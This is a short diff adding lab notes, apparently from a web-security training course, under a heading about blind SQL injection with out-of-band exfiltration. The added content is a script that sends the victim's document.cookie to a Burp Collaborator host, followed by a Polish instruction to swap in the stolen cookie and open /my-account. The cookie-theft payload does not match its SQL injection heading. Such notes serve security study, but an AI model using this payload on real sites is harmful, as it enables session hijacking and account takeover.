@@ -1,5 +1,16 @@
 ## SQL injection
 ### Blind SQL injection with out-of-band data exfiltration
+1. Exploit server:
+```js
+<script>
+fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
+method: 'POST',
+mode: 'no-cors',
+body:document.cookie
+});
+</script>
+```
+2. Podnieniamy cookie na zdobyte i wchodzimy na '/my-account`
 
 ### SQL injection with filter bypass via XML encoding
 
